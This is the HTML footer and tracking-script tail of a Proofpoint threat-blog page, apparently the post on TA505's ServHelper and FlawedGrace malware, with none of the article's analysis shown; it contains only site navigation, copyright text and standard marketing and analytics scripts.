      data-prefill=""
      data-event-label=""
      class="mk-form__form marketo-form-block__form"
    ></form>
  </div>
</div>

    </div>
  </div>
</div>

</article>

  </div>

  </div>

      </div>
    </section>
  </main>

</div>

<footer class="footer">
    <section class="footer-section">
  <div class="footer-section__wrapper">
    <div class="footer-section__top">
      <div class="footer-section__top-item">
        <div class="footer-section__top-first">
          <div class="footer-section__top-item-wrapper">
            <h2 class="footer-section__title">About</h2>
            <div class="footer-section__nav">
              <ul>
                <li><a href="/us/company/about">Overview</a></li>
                <li><a href="/us/why-proofpoint">Why Proofpoint</a></li>
                <li><a href="/us/company/careers">Careers</a></li>
                <li><a href="/us/leadership-and-board-of-directors">Leadership Team</a></li>
                <li><a href="/us/news">News Center</a></li>
                <li><a href="http://investors.proofpoint.com" target="_blank">Investors Center</a></li>
                <li><a href="/us/why-proofpoint/nexus-threat-graph">Nexus Platform</a></li>
              </ul>
            </div>
          </div>
          <div class="footer-section__top-item-wrapper">
            <h2 class="footer-section__title">Threat Center</h2>
            <div class="footer-section__nav">
              <ul>
                <li><a href="/us/resources/threat-reports/latest-quarterly-threat-research">Latest Threat Report</a></li>
                <li><a href="/us/resources/threat-reports/human-factor">Human Factor Report</a></li>
                <li><a href="/us/threat-reference">Threat Glossary</a></li>
                <li><a href="/us/blog/threat-insight">Threat Blog</a></li>
                <li><a href="/us/daily-ruleset-update-summary">Daily Ruleset</a></li>
              </ul>
            </div>
          </div>
        </div>
      </div>

      <div class="footer-section__top-item">
        <div class="footer-section__top-second">
          <div class="footer-section__top-item-wrapper">
            <h2 class="footer-section__title">Products</h2>
            <div class="footer-section__nav">
              <ul>
                <li><a href="/us/products/email-security-and-protection">Email Security &amp; Protection</a></li>
                <li><a href="/us/products/advanced-threat-protection">Advanced Threat Protection</a></li>
                <li><a href="/us/products/security-awareness-training">Security Awareness Training</a></li>
                <li><a href="/us/products/cloud-security">Cloud Security</a></li>
                <li><a href="/us/products/archiving-and-compliance">Archive &amp; Compliance</a></li>
                <li><a href="/us/products/information-protection">Information Protection</a></li>
                <li><a href="/us/products/digital-risk-protection">Digital Risk Protection</a></li>
                <li><a href="/us/solutions/bundles">Product Bundles</a></li>
              </ul>
            </div>
          </div>
          <div class="footer-section__top-item-wrapper">
            <h2 class="footer-section__title">Resources</h2>
            <div class="footer-section__nav">
              <ul>
                <li><a href="/us/resources/white-paper">Whitepapers</a></li>
                <li><a href="/us/resources/webinar">Webinars</a></li>
                <li><a href="/us/resources/data-sheet">Datasheets</a></li>
                <li><a href="/us/company/events">Events</a></li>
                <li><a href="/us/customer-stories">Customer Stories</a></li>
                <li><a href="/us/blog">Blog</a></li>
                <li><a href="/us/free-trial-request">Free Trial</a></li>
              </ul>
            </div>
          </div>
        </div>
      </div>

      <div class="footer-section__top-item">
        <div class="footer-section__top-third">
          <div class="footer-section__top-item-wrapper">
            <h2 class="footer-section__title footer-section__title-no-border">Connect</h2>
            <div class="footer-section__nav">
              <ul>
                <li><a href="tel:+1-408-517-4710" class="icon-phone-ppoint">+1-408-517-4710</a></li>
                <li><a href="/us/contact">Contact Us</a></li>
                <li><a href="/us/contact/office-locations">Office Locations</a></li>
                <li><a href="/us/free-demo-request">Request a Demo</a></li>
              </ul>
            </div>
          </div>
          <div class="footer-section__top-item-wrapper">
            <h2 class="footer-section__title footer-section__title-no-border">Support</h2>
            <div class="footer-section__nav">
              <ul>
                <li><a href="https://proofpointcommunities.force.com/community/s/" target="_blank">Support Login</a></li>
                <li><a href="/us/support-services">Support Services</a></li>
                <li><a href="https://ipcheck.proofpoint.com" target="_blank">IP Address Blocked?</a></li>
              </ul>
            </div>
          </div>
        </div>
      </div>

    </div>
  </div>
</section>
<section class="footer-bottom">
  <div class="footer-section__wrapper">
    <div class="footer-bottom__logo">
      <a href="/us" title=Home rel="home"></a>
    </div>
    <div class="footer-bottom__wrapper">
      <div class="footer-bottom__social-menu">
        <ul class="footer-bottom__social-list">
          <li><a href="http://www.facebook.com/proofpoint" class="icon-facebook" target="_blank">Facebook</a></li>
          <li><a href="http://www.twitter.com/proofpoint" class="icon-twitter" target="_blank">Twitter</a></li>
          <li><a href="https://www.linkedin.com/company/proofpoint" class="icon-linkedin" target="_blank">linkedin</a></li>
          <li><a href="https://www.youtube.com/channel/UCIvtJgsrUzFo90NKeiVozhQ" class="icon-youtube-play" target="_blank">Youtube</a></li>
        </ul>
      </div>
      <div class="footer-bottom__regions">
        <div class="footer-bottom__regions-wrapper">
          <ul class="footer-bottom__regions-menu">
            <li><a href="https://www.proofpoint.com/us">United States</a></li>
            <li><a href="https://www.proofpoint.com/uk">United Kingdom</a></li>
            <li><a href="https://www.proofpoint.com/fr">France</a></li>
            <li><a href="https://www.proofpoint.com/de">Germany</a></li>
            <li><a href="https://www.proofpoint.com/it">Italy</a></li>
            <li><a href="https://www.proofpoint.com/es">Spain</a></li>
            <li><a href="https://www.proofpoint.com/jp">Japan</a></li>
            <li><a href="https://www.proofpoint.com/au">Australia</a></li>
          </ul>
        </div>
      </div>
      <div class="footer-bottom__copyright">
        <div class="footer-bottom__copyright-info footer-section__wrapper">
          <p>&copy; 2021. All rights reserved.
            <a href="/us/license">Terms and conditions</a>
            <a href="/us/privacy-policy">Privacy Policy</a>
            <a href="/us/sitemap.xml">Sitemap</a>
          </p>
          <p>&nbsp;</p>
        </div>
      </div>
    </div>
  </div>
</section>

</footer>

  </div>

    <script type="text/javascript">document.write(unescape("%3Cscript src='//munchkin.marketo.net/munchkin.js' type='text/javascript'%3E%3C/script%3E")); </script> <script>Munchkin.init('309-RHV-619');</script><div class="element-invisible" style="clear:both;"><script>
                        (function(d,b,a,s,e){ var t = b.createElement(a),
                          fs = b.getElementsByTagName(a)[0]; t.async=1; t.id=e;
                          t.src=('https:'==document.location.protocol ? 'https://' : 'http://') + s;
                          fs.parentNode.insertBefore(t, fs); })
                          (window,document,'script','scripts.demandbase.com/MP9Jyqtx.min.js','demandbase_js_lib');
                        </script></div><div class="element-invisible" style="clear:both;"><!-- Google Code for Remarketing Tag -->
                <!--------------------------------------------------
                Remarketing tags may not be associated with personally identifiable information or placed on pages related to sensitive categories. See more information and instructions on how to setup the tag on: http://google.com/ads/remarketingsetup
                --------------------------------------------------->
                <script type="text/javascript">
                /* <![CDATA[ */
                var google_conversion_id = 950296937;
                var google_custom_params = window.google_tag_params;
                var google_remarketing_only = true;
                /* ]]> */
                </script>
                <script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
                </script>
                <noscript>
                <div style="display:inline;">
                <img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/950296937/?value=0&amp;guid=ON&amp;script=0"/>
                </div>
                </noscript></div>
    <script type="application/json" data-drupal-selector="drupal-settings-json">{"path":{"baseUrl":"\/","scriptPath":null,"pathPrefix":"us\/","currentPath":"node\/50006","currentPathIsAdmin":false,"isFront":false,"currentLanguage":"en"},"pluralDelimiter":"\u0003","suppressDeprecationErrors":true,"ajaxPageState":{"libraries":"core\/html5shiv,core\/picturefill,particle\/core,pp_i18n\/language-detector,pp_marketo\/munchkin,pp_search\/utils,pp_share\/addthis_custom,pp_theme\/tabnabbing,pp_theme\/toolbar,system\/base","theme":"particle","theme_token":null},"ajaxTrustedUrl":[],"pp_i18n":{"language":"us"},"instantsearch":{"indexName":"content","path":"search"},"addthis":{"widget_url":"\/\/s7.addthis.com\/js\/300\/addthis_widget.js#async=1","addthis_config":{"pubid":"","services_compact":"facebook,linkedin,twitter,email","services_exclude":"","data_track_clickback":false,"ui_508_compliant":false,"ui_click":false,"ui_cobrand":"","ui_delay":0,"data_track_addressbar":false,"ui_header_background":"","ui_header_color":"","ui_open_windows":false,"ui_use_css":true,"ui_use_addressbook":false},"addthis_share":{"passthrough":{"twitter":{"via":"Proofpoint"}},"imp_url":0,"url":"https:\/\/www.proofpoint.com\/us\/threat-insight\/post\/servhelper-and-flawedgrace-new-malware-introduced-ta505","title":"ServHelper and FlawedGrace - New malware introduced by TA505 | Proofpoint US","description":"Proofpoint researchers detail two undocumented pieces of malware being used by TA505.\n"}},"user":{"uid":0,"permissionsHash":"4c28ad0c00f91ce2f641fd4e797608915844fcd37eb481ad4941448f5467db28"}}</script>
<script src="/sites/default/files/js/js_Y34A6OnnfHzqt_szrQVCKEL_N-3nIgWvbqab7X_nGHc.js"></script>
<script src="https://geoip-js.com/js/apis/geoip2/v2.1/geoip2.js"></script>
<script src="/sites/default/files/js/js_Mypic69v3AM_k2tnVLPIrzNXY0af6UrC_DJGJz1MY-A.js"></script>
<script src="//munchkin.marketo.net/munchkin.js"></script>
<script src="/sites/default/files/js/js_d7QFzHRFEQgPXZHAvRlXfFloTKepxUA-8okTFJZLst4.js"></script>

  <script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam-cell.nr-data.net","licenseKey":"0ae22ad83e","applicationID":"573869349","transactionName":"bgQBYERQXBBWVBFbDldOIldCWF0NGHMXRxFYDT9aWVVXP3RYC0YTVg0PUURtfAxTUjNbBE4iDFpCQ10PW1IXH19PCAZD","queueTime":0,"applicationTime":559,"atts":"QkMWFgxKT08VVkcIGkQc","errorBeacon":"bam-cell.nr-data.net","agent":""}</script></body>
</html>
